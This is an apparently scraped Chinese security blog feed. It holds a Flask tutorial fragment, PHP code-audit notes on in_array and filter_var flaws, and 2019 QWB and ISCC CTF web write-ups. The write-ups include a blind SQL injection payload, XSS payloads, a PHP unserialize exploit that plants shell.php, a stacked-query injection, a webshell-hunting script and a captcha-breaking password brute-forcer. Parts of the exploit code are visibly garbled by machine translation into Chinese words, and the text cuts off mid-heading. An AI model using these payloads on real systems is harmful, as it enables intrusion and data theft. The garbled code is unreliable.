<span class="hljs-meta-keyword">html</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></code></pre><p>python shell脚本</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_templateapp = Flask(name)<span class="hljs-meta">@app.route('/hello/&lt;user&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_name</span><span class="hljs-params">(user)</span>:</span>   <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'hello.html'</span>, name = user)<span class="hljs-keyword">if</span> name == <span class="hljs-string">'main'</span>:   app.run(debug = <span class="hljs-literal">True</span>)</code></pre><h2 id="Jinja2模板引擎使用以下分隔符从HTML转义。"><a href="#Jinja2模板引擎使用以下分隔符从HTML转义。" class="headerlink" title="Jinja2模板引擎使用以下分隔符从HTML转义。"></a>Jinja2模板引擎使用以下分隔符从HTML转义。</h2><pre><code class="hljs clean">&#123;% ... %&#125;用于语句&#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出&#123;# ... #&#125;用于未包含在模板输出中的注释 # ... ##用于行语句</code></pre><h2 id="模板DEMO"><a href="#模板DEMO" class="headerlink" title="模板DEMO"></a>模板DEMO</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">1</span>&gt;</span>     &#123;% for key, value in result.iteritems() %&#125;    <span class="hljs-symbol">&amp;lt;</span>tr<span class="hljs-symbol">&amp;gt;</span>       <span class="hljs-symbol">&amp;lt;</span>th<span class="hljs-symbol">&amp;gt;</span> &#123;&#123; key &#125;&#125; <span class="hljs-symbol">&amp;lt;</span>/th<span class="hljs-symbol">&amp;gt;</span>       <span class="hljs-symbol">&amp;lt;</span>td<span class="hljs-symbol">&amp;gt;</span> &#123;&#123; value &#125;&#125; <span class="hljs-symbol">&amp;lt;</span>/td<span class="hljs-symbol">&amp;gt;</span>    <span class="hljs-symbol">&amp;lt;</span>/tr<span class="hljs-symbol">&amp;gt;</span> &#123;% endfor %&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><h1 id="八、Flask静态文件"><a href="#八、Flask静态文件" class="headerlink" title="八、Flask静态文件"></a>八、Flask静态文件</h1><p>模板引入javascript和css文件。通常将这些文件默认保存在/static下</p><p><strong>/demo_index.py</strong></p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_templateapp = Flask(__name__)<span class="hljs-meta">@app.route("/")</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:   app.run(debug = <span class="hljs-literal">True</span>)</code></pre><p><strong>/templates/index.html</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"text/javascript"</span> </span><span class="hljs-tag">         <span class="hljs-attr">src</span> = <span class="hljs-string">"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"button"</span> <span class="hljs-attr">onclick</span> = <span class="hljs-string">"sayHello()"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"Say Hello"</span> /&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><strong>/static/hello.js</strong></p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params"></span>) </span>&#123;   alert(<span class="hljs-string">"Hello World"</span>)&#125;</code></pre><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre><code class="hljs shell">├── demo_index.py├── static│   └── hello.js├── templates│   ├── hello.html│   └── index.html</code></pre><h1 id="九、Flask-Request对象"><a href="#九、Flask-Request对象" class="headerlink" title="九、Flask Request对象"></a>九、Flask Request对象</h1><p>Request对象属性</p><blockquote><p>Form - 它是一个字典对象，包含表单参数及其值的键和值对。<br>args - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。<br>Cookies  - 保存Cookie名称和值的字典对象。<br>files - 与上传文件有关的数据。<br>method - 当前请求方法。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.w3cschool.cn/flask" target="_blank" rel="noopener">Flask w3school</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[XSS] | &#39;alert(1) win&#39;题解(一)</title>
    <link href="/2019/07/07/XSS-alert-1-win-%E9%A2%98%E8%A7%A3-%E4%B8%80/"/>
    <url>/2019/07/07/XSS-alert-1-win-%E9%A2%98%E8%A7%A3-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="828feeb0e7de84eb601059b459d455bfc8ab0615451808834f53878ab56ca898"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于TP5后端编写</title>
    <link href="/2019/06/28/%E5%9F%BA%E4%BA%8ETP5%E5%90%8E%E7%AB%AF%E7%BC%96%E5%86%99/"/>
    <url>/2019/06/28/%E5%9F%BA%E4%BA%8ETP5%E5%90%8E%E7%AB%AF%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本想着自己开发个个人博客，但写了个后端逻辑就花了很多时间。正好学一波MVC、tp框架。<br>项目地址：<a href="https://github.com/zhzhdoai/tp5-adminMVC" target="_blank" rel="noopener">https://github.com/zhzhdoai/tp5-adminMVC</a></p><h1 id="网站应用目录结构"><a href="#网站应用目录结构" class="headerlink" title="网站应用目录结构"></a>网站应用目录结构</h1><blockquote><p>├── admin<br>│   ├── controller<br>│   │   ├── Category.php<br>│   │   ├── Common.php<br>│   │   ├── Entry.php<br>│   │   └── Login.php<br>│   ├── validate<br>│   │   ├── Admin.php<br>│   │   └── Category.php<br>│   └── view<br>│       ├── base.html<br>│       ├── category<br>│       │   ├── addson.html<br>│       │   ├── edit.html<br>│       │   ├── index.html<br>│       │   └── store.html<br>│       ├── entry<br>│       │   ├── index.html<br>│       │   └── pass.html<br>│       └── login<br>│           └── index.html<br>├── command.php<br>├── common<br>│   └── model<br>│       ├── Admin.php<br>│       └── Category.php<br>├── common.php<br>├── config.php<br>├── database.php<br>├── index<br>│   └── controller<br>│       └── Index.php<br>├── route.php<br>└── tags.php</p></blockquote><h1 id="网站功能"><a href="#网站功能" class="headerlink" title="网站功能"></a>网站功能</h1><ol><li>管理员后台登录</li><li>验证码引入</li><li>顶级栏目和子栏目添加</li><li>修改密码</li></ol><h1 id="功能效果图"><a href="#功能效果图" class="headerlink" title="功能效果图"></a>功能效果图</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>基于框架开发的安全性和优越性</li><li>学习了一波MVC框架</li><li>模板继承和渲染</li><li>tp5框架学习</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RIPS[1] | in_array函数缺陷</title>
    <link href="/2019/06/02/RIPS-1-in-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/"/>
    <url>/2019/06/02/RIPS-1-in-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="in-arrary"><a href="#in-arrary" class="headerlink" title="in_arrary"></a>in_arrary</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>in_array()检查输入的文件名是否存在白名单$whitelist中。当in_arrary第三个参数未设置为true时，传入文件名为”5webshell.php”会将”5webshell.php”转换为整型5满足白名单，将导致Web服务器上的代码执行。<br>piwigo/picture.php第268行满足action=rate进入case “rate”</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>跟进rate_picture方法，piwigo/include/functions_rate.inc.php第40行<br>存在in_array方法判断传入参数rate是否满足，piwigo/include/config_default.inc.php查看该值为<br>$conf[‘rate_items’] = array(0,1,2,3,4,5);</p><p><strong>利用in_arrary未加第三个参数true造成弱类型比较进行绕过</strong></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>绕过in_array语句，rate值带入数据库查询。配置文件只使用addslashes进行消毒，这里可用bool注入即可成功。</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="hljs lisp">INSERT INTO piwigo_rate (<span class="hljs-name">user_id</span>,anonymous_id,element_id,rate,date) VALUES (<span class="hljs-number">2</span>,'<span class="hljs-number">192.168</span>.<span class="hljs-number">2</span>',<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span> and if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=112,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>)))<span class="hljs-comment">;#,NOW()) ;</span></code></pre><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2018/06/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day1%20-%20in_array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/06/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day1%20-%20in_array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RIPS[2] | filter_var函数缺陷</title>
    <link href="/2019/06/02/RIPS-2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/"/>
    <url>/2019/06/02/RIPS-2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>代码使用twig模板引擎加载html。参考链接：<a href="https://twig.symfony.com/" target="_blank" rel="noopener">https://twig.symfony.com/</a><br>__construct构造函数加载html代码并使用escape对link第一次过滤。Escape源码是调用php的htmlspecialchars</p><pre><code class="hljs 1c"><span class="hljs-meta">&amp; (&amp; 符号)&amp;amp</span><span class="hljs-string">" (双引号)&amp;quot</span>' (单引号) &amp;apos&lt; (小于)&amp;lt&gt; (大于)  &amp;gt</code></pre><p>getNexSlideUrl()方法对使用filter_var对变量$nextSlide二次过滤，并添加FILTER_VALIDATE_URL参数加载。但使用javascript伪协议能够绕过该过滤器，可绕过htmlspecialchars限制的转义字符。<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>题目代码可以等价于如下代码。<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>Payload:?url=javascript://comment%0Aalert(1);</p><blockquote><p>//为注释符号，%0a为换行符为了不使得被浏览器解码为实体进行二次url编码。</p></blockquote><p>最终payload:?url=javascript%3a%2f%2fcomment%250Aalert(1)%3b</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><p>anchor-cms-0.9.2是一个博客系统，漏洞触发点为访问一个未知界面会跳转至404界面<br>文件位于/themes/default/404.php current_url()</p><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>从current_url()进行溯源helpers.php=&gt;uri.php第81行current()方法<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br>跟进$current变量赋值detect()方法<br>使用server类接收$_SERVER全局变量。遍历$server第一个if语句判断是否为空，进入第二个if语句使用filter_var使用url过滤器消毒，为真进入第三个if语句解析url<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>跟进format()方法，经过三次url过滤.remove_script_name、remove_relarive_uri只是获取文件名，并未对xss过滤。<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>Payload:<a href="http://127.0.0.1/anchor-cms-0.9.2/index.php/%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E" target="_blank" rel="noopener">http://127.0.0.1/anchor-cms-0.9.2/index.php/%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E</a></p><p>经过format对url文件名提取，提取文件名为“”放入标签中</p><p><img src="./9.png" srcset="/img/loading.gif" alt=""><br>$uri = static::remove_script_name($uri, $server);实际调用remove方法phpstorm调试代码如下。<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>remove_relative_uri($uri)调试代码,Config类下的$arrary变量存储着网站应用数据方便调用。config::app正式通过这种方式提取$base变量。</p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2018/07/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day2%20-%20filter_var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/07/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day2%20-%20filter_var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019强网杯web部分题解</title>
    <link href="/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01上传"><a href="#0x01上传" class="headerlink" title="0x01上传"></a>0x01上传</h1><p>Docker环境：https：//github.com/CTFTraining/qwb_2019_upload<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。<br>通过dirsearch扫到网站源码。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>拿到源码首先需要查看配置文件和路由<br>，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。</p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>查看TP5 /路由/ route.php路由功能文件，分析URL访问时控制类调用情况。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>Thinkphp5框架是最新版，没有找到漏洞。遂跟进网站应用控制类下。</p><p>TP5 /应用/网页/控制器/ index.php的第37行<br>$profile通过cookie传入，存在任意类反序列化操作<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>搜索有可以利用的函数，发现TP5 /应用/网页/控制器/ Profile.php第43行<br>存在文件重名操作copy</p><p><img src="./6.png" srcset="/img/loading.gif" alt=""><br>在profile.php下文件存在<strong>get()、</strong>call()魔术方法可以利用。<br><strong>call()通过类调用不存在方法而触发。通过可以</strong>get()向$this-&gt;{$name}传入upload_img方法，进行upload_img()方法二次调用，执行文件名重写。</p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>在TP5 /应用/网页/控制器/ Register.php第58行，发现析构函数，检查为类变量可控。通过类轮廓调用不存在的索引（）方法即可触发轮廓类下的__call魔术方法。</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""><br>编写EXP</p><pre><code class="hljs ruby">&lt;？php namespace app \ web \ controller; 使用think \ Controller; /<span class="hljs-regexp">/先传入带有shell的图片马，然后将生成的cookie替换当前用户字段，重新加载界面，就可以执行木马。路径可以在传入图片之后网页源码找到</span><span class="hljs-regexp">.class Register &#123; </span><span class="hljs-regexp">    public $ checker; </span><span class="hljs-regexp">    public $ registed = false; </span><span class="hljs-regexp">    public function __construct（$ checker）</span><span class="hljs-regexp">    &#123; </span><span class="hljs-regexp">        $ this-&gt; checker = $ checker; </span><span class="hljs-regexp">    &#125; </span><span class="hljs-regexp">&#125; </span><span class="hljs-regexp">类档案&#123; </span><span class="hljs-regexp">    公共$ filename_tmp = “./</span>上传/ <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / f3ccdd27d2000e3f9255a7e3e2c4880<span class="hljs-number">0</span>.png”;     public $ filename =“./ upload / <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / shell.php”;     public $ ext = <span class="hljs-literal">true</span>;     public $ except = array（<span class="hljs-string">'index'</span>=&gt;<span class="hljs-string">'upload_img'</span>）; &#125; $ a = new Register（new Profile（））;印刷（用urlencode（BASE64_ENCODE（连载（$ A））））;</code></pre><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02随便注"><a href="#0x02随便注" class="headerlink" title="0x02随便注"></a>0x02随便注</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_supersqli<br>尝试Sql注入弹出如下过滤情况<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br>发现存在堆叠注入<br><code>1’;show tables;#</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><p>使用预编译语句插入查询语句<br>参考官方链接:(编写的SQL语句语法）[ <a href="https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]</a></p><pre><code class="hljs less">设置<span class="hljs-variable">@sql</span> = concat（<span class="hljs-string">'sel'</span>，<span class="hljs-string">'ect * from'</span><span class="hljs-number">1919810931114514</span>`'）; 从<span class="hljs-variable">@sql</span>准备presql; 执行<span class="hljs-selector-tag">presql</span>; <span class="hljs-selector-tag">deallocate</span>准备<span class="hljs-selector-tag">presql</span>;</code></pre><p><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p>使用strstr过滤set、prepare。大小写绕过即可<br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_smarthacker</p><p><img src="./15.png" srcset="/img/loading.gif" alt=""><br>拉下网页源码，发现存在shell语句但无法判断哪个是真正的Shell<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br>类似有assert、eval、system相关函数<br>编写脚本批量查shell<br><img src="./17.png" srcset="/img/loading.gif" alt=""><br><a href="http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a><br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,re,requestsfilename=os.listdir(<span class="hljs-string">'/var/www/html/src'</span>)pattern=re.compile(<span class="hljs-string">r"\$_[GETPOS]&#123;3,4&#125;\[.*\]"</span>)j=<span class="hljs-number">1</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> filename:    q=j+<span class="hljs-number">1</span>    print(i)    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'/var/www/html/src/'</span>+i,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:        data=f.read()    reqname=list(set(pattern.findall(data)))    <span class="hljs-keyword">for</span> ret <span class="hljs-keyword">in</span> reqname:        <span class="hljs-keyword">try</span>:            command=<span class="hljs-string">'uname'</span>            flag=<span class="hljs-string">'Linux'</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">'GET'</span> <span class="hljs-keyword">in</span> ret:                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i                params=&#123;parm:command&#125;                r=requests.get(url=url,params=params)                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:                    print(<span class="hljs-string">'webshell filename is: '</span>+i)                    print(<span class="hljs-string">'GET_name: '</span>+parm)            <span class="hljs-keyword">if</span> <span class="hljs-string">'POST'</span> <span class="hljs-keyword">in</span> ret:                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i                data=&#123;parm:command&#125;                r=requests.post(url=url,data=data)                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:                    print(<span class="hljs-string">'webshell filename is: '</span>+i)                    print(<span class="hljs-string">'POST_name: '</span>+parm)        <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019ISCC_web题解</title>
    <link href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>观察<code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code>生成过程为<code>chr(value_ascii)</code>拼接。<br>但脚本对<code>value</code>每个<code>Ascii</code>值进行判断<code>&gt;32&amp;&amp;&lt;127</code>则删除value值,直接传入<code>‘w3lc0me_To_ISCC2019’</code>对应<code>ascii</code>将被<code>unset</code>。</p><p>翻看官方手册发现，<code>chr()</code>会对传入数值对<code>256 mod</code>运算，取余。</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""><br>利用<code>py</code> 得到 <code>value</code>值</p><pre><code class="hljs matlab">username=<span class="hljs-string">"w3lc0me_To_ISCC2019"</span>value=&#123;&#125;str1=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> in range(<span class="hljs-number">0</span>,len(username)):value[<span class="hljs-built_in">i</span>]=ord(username[<span class="hljs-built_in">i</span>])+<span class="hljs-number">256</span>str1+=<span class="hljs-string">"value"</span>+<span class="hljs-string">"["</span>+str(<span class="hljs-built_in">i</span>)+<span class="hljs-string">"]="</span>+str(value[<span class="hljs-built_in">i</span>])+<span class="hljs-string">"&amp;"</span>print(str1)</code></pre><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span>val($password) &lt; <span class="hljs-number">2333</span> &amp;&amp; <span class="hljs-built_in">int</span>val($password + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2333</span></code></pre><p>考察php5弱类型，<code>intval(‘0x91d’)=0,intval(‘0x91d’+1)=2334</code>。php5能将十六进制转为十进制。<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>最终payload:</p><pre><code class="hljs angelscript">http:<span class="hljs-comment">//39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=</span><span class="hljs-number">340</span>&amp;value[<span class="hljs-number">9</span>]=<span class="hljs-number">367</span>&amp;value[<span class="hljs-number">10</span>]=<span class="hljs-number">351</span>&amp;value[<span class="hljs-number">11</span>]=<span class="hljs-number">329</span>&amp;value[<span class="hljs-number">12</span>]=<span class="hljs-number">339</span>&amp;value[<span class="hljs-number">13</span>]=<span class="hljs-number">323</span>&amp;value[<span class="hljs-number">14</span>]=<span class="hljs-number">323</span>&amp;value[<span class="hljs-number">15</span>]=<span class="hljs-number">306</span>&amp;value[<span class="hljs-number">16</span>]=<span class="hljs-number">304</span>&amp;value[<span class="hljs-number">17</span>]=<span class="hljs-number">305</span>&amp;value[<span class="hljs-number">18</span>]=<span class="hljs-number">313</span>&amp;password=<span class="hljs-number">0x91d</span></code></pre><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h1><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>存在登录框，很明显需要编写py爆破三位密码.验证码图片信息可以在.<code>/vcode.php</code>获取。<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs python">python脚本如下：<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> pytesseract<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIOimage_url=<span class="hljs-string">"http://39.100.83.188:8002/vcode.php"</span>pass_url=<span class="hljs-string">"http://39.100.83.188:8002/login.php"</span>s=requests.Session()password=<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getImageCode</span><span class="hljs-params">()</span>:</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:print(<span class="hljs-string">'-------开始识别-------'</span>)imageURL=image_urlimage=s.get(url=imageURL)captcha_img=Image.open(BytesIO(image.content))imageCode=pytesseract.image_to_string(captcha_img)print(<span class="hljs-string">'[+]验证码识别结果: '</span>,imageCode)print(<span class="hljs-string">'----------开始d效验-------------'</span>)match=re.search(<span class="hljs-string">r'^[a-z0-9]&#123;4&#125;$'</span>,imageCode)<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> match:print(<span class="hljs-string">'[-]验证码:'</span>,imageCode,<span class="hljs-string">'校验失败，继续识别'</span>)<span class="hljs-keyword">else</span>:print(<span class="hljs-string">'[+]验证码:'</span>,imageCode,<span class="hljs-string">'校验成功'</span>)<span class="hljs-keyword">return</span> imageCode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(password)</span>:</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:passwd=<span class="hljs-string">""</span><span class="hljs-keyword">if</span> len(str(password))!=<span class="hljs-number">3</span>:count=<span class="hljs-number">3</span>-len(str(password))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,count+<span class="hljs-number">1</span>):passwd=passwd+<span class="hljs-string">"0"</span><span class="hljs-keyword">if</span> len(passwd)==<span class="hljs-number">4</span>:<span class="hljs-keyword">break</span>passwd=passwd+str(password)print(<span class="hljs-string">'--------------开始猜测密码++++++++++++'</span>)imageCode=getImageCode()data=&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'admin'</span>,<span class="hljs-string">'pwd'</span>:passwd,<span class="hljs-string">'user_code'</span>:imageCode&#125;g=s.post(url=pass_url,data=data)g.encoding=g.apparent_encodingprint(g.text)<span class="hljs-keyword">if</span> <span class="hljs-string">'验证码错误'</span> <span class="hljs-keyword">in</span> g.text:print(g.text)<span class="hljs-keyword">elif</span> <span class="hljs-string">'密码错误'</span> <span class="hljs-keyword">in</span> g.text:print(<span class="hljs-string">'密码：'</span>,passwd,<span class="hljs-string">'错误'</span>)password+=<span class="hljs-number">1</span><span class="hljs-keyword">else</span>:print(<span class="hljs-string">'密码：'</span>,passwd,<span class="hljs-string">'正确'</span>)print(<span class="hljs-string">'返回网页结果：'</span>)print(g.text)<span class="hljs-keyword">break</span>guess(password)password=<span class="hljs-number">996</span>登录得到flag</code></pre><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h2><p>登录抓取POST包，将<code>cookie、capture</code>删除即可绕过验证码。使用burp爆破密码即可<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 